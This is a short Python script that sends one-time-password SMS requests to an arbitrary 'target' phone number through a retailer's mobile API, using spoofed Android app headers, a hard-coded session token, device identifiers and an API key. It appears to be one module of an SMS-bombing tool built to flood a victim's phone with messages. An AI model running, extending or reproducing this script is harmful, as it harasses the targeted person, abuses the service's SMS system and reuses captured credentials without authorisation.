import requests

def run(phone_number):
    """
    Function to handle the OTP API logic for Lenskart.

    :param phone_number: The phone number to target.
    """
    try:
        # API URL
        url = "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp"

        # Payload
        payload = {
            "phoneCode": "+91",
            "telephone": phone_number
        }

        # Headers
        headers = {
            "Host": "api-gateway.juno.lenskart.com",
            "x-country-code-override": "IN",
            "accept-language": "en",
            "x-session-token": "ba761dad-180a-4dd5-b193-ef1c2e1bd142",
            "appversion": "4.2.6 (240405001)",
            "accept-encoding": "gzip",
            "x-build-version": "240405001",
            "api_key": "valyoo123",
            "x-accept-language": "en",
            "x-api-client": "android",
            "model": "SM-F7110",
            "x-b3-traceid": "1714497016147",
            "udid": "c7abc1fd7459e84c",
            "x-country-code": "IN",
            "brand": "samsung",
            "uniqueid": "18f2ffc5153c7abc",
            "Content-Type": "application/json",
            "x-app-version": "4.2.6 (240405001)",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)"
        }

        # Sending the POST request
        response = requests.post(url, json=payload, headers=headers)

        # Handling the response
        if response.status_code == 200:
            print(f"OTP sent successfully to {phone_number}")
            print(f"Response: {response.json()}")
        else:
            print(f"Failed to send OTP to {phone_number}. Status: {response.status_code}, Response: {response.text}")

    except Exception as e:
        # Log any unexpected errors
        print(f"Error while sending OTP to {phone_number}: {e}")

# Example usage
